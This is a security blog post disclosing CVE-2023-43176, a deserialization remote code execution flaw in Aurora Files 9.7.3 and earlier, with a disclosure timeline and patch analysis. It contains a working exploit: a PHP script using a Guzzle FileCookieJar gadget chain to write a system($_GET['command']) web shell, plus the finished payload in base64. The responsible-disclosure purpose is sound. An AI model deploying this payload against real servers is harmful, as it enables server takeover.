<!DOCTYPE html><html lang="en" data-astro-cid-bvzihdzo> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/icon" href="/favicon.ico"><link rel="sitemap" href="/sitemap-index.xml"><meta name="generator" content="Astro v4.16.18"><meta name="theme-color" content="#131114"><!-- Canonical URL --><link rel="canonical" href="https://sec.leonardini.dev/blog/cve-2023-43176-rce_aurora_files/"><!-- Primary Meta Tags --><title>CVE-2023-43176: Remote Code Execution on Aurora Files &lt;= 9.7.3</title><meta name="title" content="CVE-2023-43176: Remote Code Execution on Aurora Files <= 9.7.3"><meta name="description" content="A vulnerability found in Aurora Files allows an attacker to perform remote code execution on the server by uploading a malicious file containing a serialized PHP object."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://sec.leonardini.dev/blog/cve-2023-43176-rce_aurora_files/"><meta property="og:title" content="CVE-2023-43176: Remote Code Execution on Aurora Files <= 9.7.3"><meta property="og:description" content="A vulnerability found in Aurora Files allows an attacker to perform remote code execution on the server by uploading a malicious file containing a serialized PHP object."><meta property="og:image" content="https://sec.leonardini.dev/placeholder-social.jpg"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://sec.leonardini.dev/blog/cve-2023-43176-rce_aurora_files/"><meta name="twitter:title" content="CVE-2023-43176: Remote Code Execution on Aurora Files <= 9.7.3"><meta name="twitter:description" content="A vulnerability found in Aurora Files allows an attacker to perform remote code execution on the server by uploading a malicious file containing a serialized PHP object."><meta name="twitter:image" content="https://sec.leonardini.dev/placeholder-social.jpg"><link rel="stylesheet" href="/_astro/about.DeLk6OmX.css">
<style>.title[data-astro-cid-bvzihdzo]{font-size:2em;margin:.25em 0}hr[data-astro-cid-bvzihdzo]{display:block;height:1px;border:0;border-top:1px solid #a0a0a0;margin:1em 0;padding:0}.last-updated-on[data-astro-cid-bvzihdzo]{font-style:italic}
</style><style>div[data-astro-cid-zhxkjw2l].timeline{display:grid;padding:1rem 0}div.timeline div:nth-child(odd){font-weight:700;white-space:nowrap;vertical-align:top;padding-right:1rem;color:#42a37f;letter-spacing:.025em;margin-top:.75rem}@media screen and (min-width: 701px){div[data-astro-cid-zhxkjw2l].timeline{grid-template-columns:auto 1fr;gap:.5rem 0}div.timeline div:nth-child(odd){margin-top:0rem}}
</style></head> <body data-astro-cid-bvzihdzo> <header data-astro-cid-3ef6ksr2> <h2 data-astro-cid-3ef6ksr2> Lorenzo Leonardini&#39;s security blog </h2> <nav data-astro-cid-3ef6ksr2> <a href="/" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> posts </a>  <a href="/about" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> about </a>  <a href="https://bsky.app/profile/sec.leonardini.dev" target="_blank" rel="noopener" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> 
bluesky
 </a>  <a href="https://twitter.com/_lorenzo_leo" target="_blank" rel="noopener" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> 
twitter
 </a>  <a href="https://leonardini.dev" target="_blank" rel="noopener" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> 
main site
 </a>  </nav> </header>  <main data-astro-cid-bvzihdzo> <article data-astro-cid-bvzihdzo>  <h1 class="title" data-astro-cid-bvzihdzo>CVE-2023-43176: Remote Code Execution on Aurora Files &lt;= 9.7.3</h1> <time datetime="2023-09-28T00:00:00.000Z">Sep 28, 2023</time>  <hr data-astro-cid-bvzihdzo>  <p><a href="https://afterlogic.org/aurora-files" target="_blank" rel="noopener noreferrer">Aurora Files</a> is an <em>“open source file storage and sharing platform”</em> developed by <a href="https://afterlogic.org/" target="_blank" rel="noopener noreferrer">Afterlogic</a>. This blog posts revolves around a vulnerability I found, assigned <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43176" target="_blank" rel="noopener noreferrer">CVE-2023-43176</a>, that allows an attacker to perform remote code execution on the server by uploading a malicious <code>.sabredav</code> file containing a serialized PHP object.</p>
<h2 id="overview">Overview</h2>
<p>Aurora Files is an open source cloud storage solution that allows you to upload and manage files and share them with other users. It’s designed as a basic framework paired with many separate modules that implement every small feature of the platform. Such modules include, among others: the main web UI, an administrative API, basic file storage, end-to-end encrypted storage, and S3-based storage. Aurora is therefore completely modular and can be expanded and/or modified as one sees fit.</p>
<p>In order to offer its functionality to third-party clients, Aurora supports the <a href="https://en.wikipedia.org/wiki/WebDAV" target="_blank" rel="noopener noreferrer">WebDAV</a> protocol, and exposes a WebDAV server. In fact, Aurora uses WebDAV to manage files internally as well. The protocol and its functionality is offered via the famous <a href="https://sabre.io/" target="_blank" rel="noopener noreferrer">SabreDAV</a> PHP library. We will come back to this very shortly.</p>
<p>During recent testings I found a vulnerability that allows any authenticated user to perform remote code execution on the server. What follows is a brief timeline of the events:</p>
<div class="timeline" style="padding: 12px 0;" data-astro-cid-zhxkjw2l> <div>September, 1st 2023</div><div><em>I contacted Afterlogic reporting the vulnerability</em></div><div>September, 4th 2023</div><div><em>I received an initial response aknowledging the report</em></div><div>September, 4th 2023</div><div><em>A first (broken) patch is pushed on Afterlogic’s GitHub</em></div><div>September, 6th 2023</div><div><em>I received a second email confirming the vulnerability and presenting the patch</em></div><div>September, 8th 2023</div><div><em>The broken patch gets fixed</em></div><div>September, 9th 2023</div><div><em>I sent a request to MITRE to reserve a CVE number for this vulnerability</em></div><div>September, 12th 2023</div><div><em>Version 9.7.4 was released, containing the patch</em></div><div>September, 25th 2023</div><div><em>MITRE reserved CVE ID <code>CVE-2023-43176</code> for this vulnerability</em></div> </div>
<h2 id="the-vuln">The vuln</h2>
<p>As I introduced before, Aurora Files uses SabreDAV to internally manage files. In particular, each user has one or more folders containing their personal files, each of them structured exactly as you see them in the web interface, with all the subfolders you decide to create and use to manage your files.</p>
<p>To store and manage metadata, each folder contains a special hidden file, named <code>.sabredav</code>, containing all the information of all the files contained in that folder. Such information include basic properties such as the file owner, as well as extended properties added and managed by the different file storage modules. All this data is stored as a serialized PHP object.</p>
<figure data-rehype-pretty-code-figure=""><pre style="background-color:#282c34;color:#abb2bf" tabindex="0" data-language="plaintext" data-theme="one-dark-pro"><code data-language="plaintext" data-theme="one-dark-pro" style="display:grid"><span data-line=""><span>a:2:{s:13:&quot;test-file.txt&quot;;a:1:{s:10:&quot;properties&quot;;a:2:{s:5:&quot;Owner&quot;;s:17:&quot;email@example.com&quot;;s:13:&quot;ExtendedProps&quot;;a:0:{}}}s:21:&quot;another-test-file.png&quot;;a:1:{s:10:&quot;properties&quot;;a:2:{s:5:&quot;Owner&quot;;s:17:&quot;email@example.com&quot;;s:13:&quot;ExtendedProps&quot;;a:0:{}}}}</span></span></code></pre></figure>
<p>What I noticed during testing is that empty folders don’t have a <code>.sabredav</code> file, as it gets created only after you upload the first file. This made me wonder whether it was possible to upload a custom <code>.sabredav</code> file in an empty folder. Turns out, it sure is! Further testing revealed that the custom <code>.sabredav</code> file gets in fact deserialized by the server, in order to attempt to read all the folder’s files metadata.</p>
<p>After having confirmed I had arbitrary object deserialization, I just needed to find out what I could do with that. As many other modern PHP projects, Aurora Files uses <a href="https://getcomposer.org/" target="_blank" rel="noopener noreferrer">Composer</a> to manage its dependencies, and makes use of an autoloader to automatically import files and classes. This means that we can use gadgets from any library.</p>
<p>One of Aurora’s dependencies is <a href="https://docs.guzzlephp.org/" target="_blank" rel="noopener noreferrer">Guzzle</a>, a PHP HTTP client, that among its classes has a <span data-rehype-pretty-code-figure=""><code data-language=".token" data-theme="one-dark-pro"><span style="color:#e5c07b">FileCookieJar</span></code></span> that defines a <span data-rehype-pretty-code-figure=""><code data-language=".token" data-theme="one-dark-pro"><span style="color:#61afef">__destruct</span></code></span> method we can exploit to gain arbitrary file write:</p>
<figure data-rehype-pretty-code-figure=""><figcaption data-rehype-pretty-code-title="" data-language="php" data-theme="one-dark-pro"><span>GuzzleHttp/Cookie/FileCookieJar.php</span></figcaption><pre style="background-color:#282c34;color:#abb2bf" tabindex="0" data-language="php" data-theme="one-dark-pro"><code data-line-numbers="" style="counter-set:line 44;display:grid" data-language="php" data-theme="one-dark-pro" data-line-numbers-max-digits="2"><span data-line=""><span style="color:#7F848E;font-style:italic">/**</span></span>
<span data-line=""><span style="color:#7F848E;font-style:italic"> * Saves the file when shutting down</span></span>
<span data-line=""><span style="color:#7F848E;font-style:italic"> */</span></span>
<span data-line="" data-highlighted-line=""><span style="color:#C678DD">public</span><span style="color:#C678DD"> function</span><span style="color:#56B6C2"> __destruct</span><span style="color:#ABB2BF">()</span></span>
<span data-line="" data-highlighted-line=""><span style="color:#ABB2BF">{</span></span>
<span data-line="" data-highlighted-line=""><span style="color:#E5C07B">    $this</span><span style="color:#ABB2BF">-&gt;</span><span style="color:#61AFEF">save</span><span style="color:#ABB2BF">(</span><span style="color:#E5C07B">$this</span><span style="color:#ABB2BF">-&gt;</span><span style="color:#E06C75">filename</span><span style="color:#ABB2BF">);</span></span>
<span data-line="" data-highlighted-line=""><span style="color:#ABB2BF">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#7F848E;font-style:italic">/**</span></span>
<span data-line=""><span style="color:#7F848E;font-style:italic"> * Saves the cookies to a file.</span></span>
<span data-line=""><span style="color:#7F848E;font-style:italic"> *</span></span>
<span data-line=""><span style="color:#7F848E;font-style:italic"> * </span><span style="color:#C678DD;font-style:italic">@param</span><span style="color:#E5C07B;font-style:italic"> string</span><span style="color:#7F848E;font-style:italic"> $filename File to save</span></span>
<span data-line=""><span style="color:#7F848E;font-style:italic"> *</span></span>
<span data-line=""><span style="color:#7F848E;font-style:italic"> * </span><span style="color:#C678DD;font-style:italic">@throws</span><span style="color:#E5C07B;font-style:italic"> \RuntimeException</span><span style="color:#7F848E;font-style:italic"> if the file cannot be found or created</span></span>
<span data-line=""><span style="color:#7F848E;font-style:italic"> */</span></span>
<span data-line=""><span style="color:#C678DD">public</span><span style="color:#C678DD"> function</span><span style="color:#61AFEF"> </span><mark data-highlighted-chars=""><span style="color:#61AFEF">save</span></mark><span style="color:#ABB2BF">(</span><span style="color:#E5C07B">string</span><span style="color:#E06C75"> $filename</span><span style="color:#ABB2BF">): </span><span style="color:#E5C07B">void</span></span>
<span data-line=""><span style="color:#ABB2BF">{</span></span>
<span data-line=""><span style="color:#E06C75">    $json</span><span style="color:#56B6C2"> =</span><span style="color:#ABB2BF"> [];</span></span>
<span data-line=""><span style="color:#7F848E;font-style:italic">    /** </span><span style="color:#C678DD;font-style:italic">@var</span><span style="color:#E5C07B;font-style:italic"> SetCookie</span><span style="color:#7F848E;font-style:italic"> $cookie */</span></span>
<span data-line=""><span style="color:#C678DD">    foreach</span><span style="color:#ABB2BF"> (</span><span style="color:#E5C07B">$this</span><span style="color:#56B6C2"> as</span><span style="color:#E06C75"> $cookie</span><span style="color:#ABB2BF">) {</span></span>
<span data-line=""><span style="color:#C678DD">        if</span><span style="color:#ABB2BF"> (</span><span style="color:#E5C07B">CookieJar</span><span style="color:#ABB2BF">::</span><span style="color:#61AFEF">shouldPersist</span><span style="color:#ABB2BF">(</span><span style="color:#E06C75">$cookie</span><span style="color:#ABB2BF">, </span><span style="color:#E5C07B">$this</span><span style="color:#ABB2BF">-&gt;</span><span style="color:#E06C75">storeSessionCookies</span><span style="color:#ABB2BF">)) {</span></span>
<span data-line=""><span style="color:#E06C75">            $json</span><span style="color:#ABB2BF">[] </span><span style="color:#56B6C2">=</span><span style="color:#E06C75"> $cookie</span><span style="color:#ABB2BF">-&gt;</span><span style="color:#61AFEF">toArray</span><span style="color:#ABB2BF">();</span></span>
<span data-line=""><span style="color:#ABB2BF">        }</span></span>
<span data-line=""><span style="color:#ABB2BF">    }</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#E06C75">    $jsonStr</span><span style="color:#56B6C2"> =</span><span style="color:#E5C07B"> Utils</span><span style="color:#ABB2BF">::</span><span style="color:#61AFEF">jsonEncode</span><span style="color:#ABB2BF">(</span><span style="color:#E06C75">$json</span><span style="color:#ABB2BF">);</span></span>
<span data-line=""><span style="color:#C678DD">    if</span><span style="color:#ABB2BF"> (</span><span style="color:#D19A66">false</span><span style="color:#56B6C2"> ===</span><span style="color:#ABB2BF"> \</span><mark data-highlighted-chars=""><span style="color:#56B6C2">file_put_contents</span></mark><span style="color:#ABB2BF">(</span><span style="color:#E06C75">$filename</span><span style="color:#ABB2BF">,</span><span style="color:#E06C75"> $jsonStr</span><span style="color:#ABB2BF">,</span><span style="color:#D19A66"> \LOCK_EX</span><span style="color:#ABB2BF">)) {</span></span>
<span data-line=""><span style="color:#C678DD">        throw</span><span style="color:#C678DD"> new</span><span style="color:#E5C07B"> \RuntimeException</span><span style="color:#ABB2BF">(</span><span style="color:#98C379">&quot;Unable to save file {</span><span style="color:#E06C75">$filename</span><span style="color:#98C379">}&quot;</span><span style="color:#ABB2BF">);</span></span>
<span data-line=""><span style="color:#ABB2BF">    }</span></span>
<span data-line=""><span style="color:#ABB2BF">}</span></span></code></pre></figure>
<p>With this we can write a PHP backdoor in the root directory, allowing us to gain arbitrary remote code execution on the server. The following script generates a malicious <code>.sabredav</code> file, with a standard <span data-rehype-pretty-code-figure=""><code data-language="php" data-theme="one-dark-pro" style="background-color:#282c34;color:#abb2bf"><span data-line=""><span style="color:#56B6C2">system</span><span style="color:#ABB2BF">(</span><span style="color:#E06C75">$_GET</span><span style="color:#ABB2BF">[</span><span style="color:#98C379">&#39;command&#39;</span><span style="color:#ABB2BF">])</span></span></code></span> payload:</p>
<figure data-rehype-pretty-code-figure=""><pre style="background-color:#282c34;color:#abb2bf" tabindex="0" data-language="php" data-theme="one-dark-pro"><code data-language="php" data-theme="one-dark-pro" style="display:grid"><span data-line=""><span style="color:#E06C75">$cookie</span><span style="color:#56B6C2"> =</span><span style="color:#C678DD"> new</span><span style="color:#ABB2BF"> \GuzzleHttp\Cookie\</span><span style="color:#E5C07B">SetCookie</span><span style="color:#ABB2BF">([</span></span>
<span data-line=""><span style="color:#98C379">    &#39;Name&#39;</span><span style="color:#ABB2BF"> =&gt; </span><span style="color:#98C379">&#39;custom&#39;</span><span style="color:#ABB2BF">, </span></span>
<span data-line=""><span style="color:#98C379">    &#39;Domain&#39;</span><span style="color:#ABB2BF"> =&gt; </span><span style="color:#98C379">&#39;example.com&#39;</span><span style="color:#ABB2BF">, </span></span>
<span data-line=""><span style="color:#98C379">    &#39;Value&#39;</span><span style="color:#ABB2BF"> =&gt; </span><span style="color:#98C379">&#39;asd&#39;</span><span style="color:#ABB2BF">, </span></span>
<span data-line=""><span style="color:#98C379">    &#39;Discard&#39;</span><span style="color:#ABB2BF"> =&gt; </span><span style="color:#D19A66">false</span><span style="color:#ABB2BF">, </span></span>
<span data-line="" data-highlighted-line=""><span style="color:#98C379">    &#39;custom&#39;</span><span style="color:#ABB2BF"> =&gt; </span><span style="color:#98C379">&#39;&lt;?php system($_GET[</span><span style="color:#56B6C2">\&#39;</span><span style="color:#98C379">command</span><span style="color:#56B6C2">\&#39;</span><span style="color:#98C379">]); ?&gt;&#39;</span></span>
<span data-line=""><span style="color:#ABB2BF">]);</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#E06C75">$jar</span><span style="color:#56B6C2"> =</span><span style="color:#C678DD"> new</span><span style="color:#ABB2BF"> \GuzzleHttp\Cookie\</span><span style="color:#E5C07B">FileCookieJar</span><span style="color:#ABB2BF">(</span><span style="color:#98C379">&#39;./backdoor.php&#39;</span><span style="color:#ABB2BF">, </span><span style="color:#D19A66">true</span><span style="color:#ABB2BF">);</span></span>
<span data-line=""><span style="color:#E06C75">$jar</span><span style="color:#ABB2BF">-&gt;</span><span style="color:#61AFEF">setCookie</span><span style="color:#ABB2BF">(</span><span style="color:#E06C75">$cookie</span><span style="color:#ABB2BF">);</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#56B6C2">file_put_contents</span><span style="color:#ABB2BF">(</span><span style="color:#98C379">&quot;.sabredav&quot;</span><span style="color:#ABB2BF">,</span><span style="color:#56B6C2"> serialize</span><span style="color:#ABB2BF">(</span><span style="color:#E06C75">$jar</span><span style="color:#ABB2BF">));</span></span></code></pre></figure>
<p>Here is the malicious <code>.sabredav</code> file itself, base64-encoded due to it containing null-bytes:</p>
<figure data-rehype-pretty-code-figure=""><pre style="background-color:#282c34;color:#abb2bf" tabindex="0" data-language="plaintext" data-theme="one-dark-pro"><code data-language="plaintext" data-theme="one-dark-pro" style="display:grid"><span data-line=""><span>TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YToxMDp7czo0OiJOYW1lIjtzOjY6ImN1c3RvbSI7czo1OiJWYWx1ZSI7czozOiJhc2QiO3M6NjoiRG9tYWluIjtzOjExOiJleGFtcGxlLmNvbSI7czo0OiJQYXRoIjtzOjE6Ii8iO3M6NzoiTWF4LUFnZSI7TjtzOjc6IkV4cGlyZXMiO047czo2OiJTZWN1cmUiO2I6MDtzOjc6IkRpc2NhcmQiO2I6MDtzOjg6Ikh0dHBPbmx5IjtiOjA7czo2OiJjdXN0b20iO3M6MzQ6Ijw/cGhwIHN5c3RlbSgkX0dFVFsnY29tbWFuZCddKTsgPz4iO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7YjowO3M6NDE6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAGZpbGVuYW1lIjtzOjE0OiIuL2JhY2tkb29yLnBocCI7czo1MjoiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAc3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO30=</span></span></code></pre></figure>
<p>After uploading the malicious <code>.sabredav</code> file we can finally test the backdoor:</p>
<p><img src="/cve-2023-43176/cve-2023-43176-aurora-backdoor.png" alt="Testin the backdoor with the Linux id command"/></p>
<h2 id="the-patch">The patch</h2>
<p>The easiest fix for this vulnerability is to blacklist the upload of any files named <code>.sabredav</code>. At the same time, proper checks need to be put in place when renaming or moving files around, in order to stop attackers from baing able to write malicious <code>.sabredav</code> files. This is the approach adopted to fix the vulnerability in Aurora Files 9.7.4 (<a href="https://github.com/afterlogic/aurora-module-personalfiles/commit/083c15daac72c8f5bd27db9cf248a599410c9cf0" target="_blank" rel="noopener noreferrer">first commit</a>, <a href="https://github.com/afterlogic/aurora-module-personalfiles/commit/547353b7ca2716fe9d751f169364efa1fe1cd54f" target="_blank" rel="noopener noreferrer">second commit</a>).</p>
<p>However, such a patch should only be considered temporary, as future changes and updates to the codebase might introduce ways to bypass these filters. The optimal solution would be to completely remove PHP object serialization and deserialization, as file metadata might be easily stored in a JSON file or database. Afterlogic agreed with me and informed me their long-term plan is to remove the <code>.sabredav</code> file entirely in favour of a database.</p>
<h2 id="conclusions">Conclusions</h2>
<p>If you are using Aurora Files &lt;= 9.7.3 it is extremely important to update your installation to the latest version. I believe Afterlogic deserves to be praised for how quickly they have been responding to my emails, as they never took more than a business day to get back to me. Properly handling security issues is of extreme importance and being able to quickly discuss and solve such issues is really fundamental in order to keep products secure. The only thing I feel I should criticize is the absence of any reference to this issue in the latest changelog: users should be informed of security fixes in order to properly update and keep their installations safe.</p>
<p>All in all, my first CVE experience went pretty smoothly!</p>  </article> </main> <footer data-astro-cid-sz7xmlte>&copy; Lorenzo Leonardini. All rights reserved.</footer>  <!-- Cloudflare Pages Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "3d6478898a4143ce8ce1cc4294590a59"}'></script><!-- Cloudflare Pages Analytics --></body></html>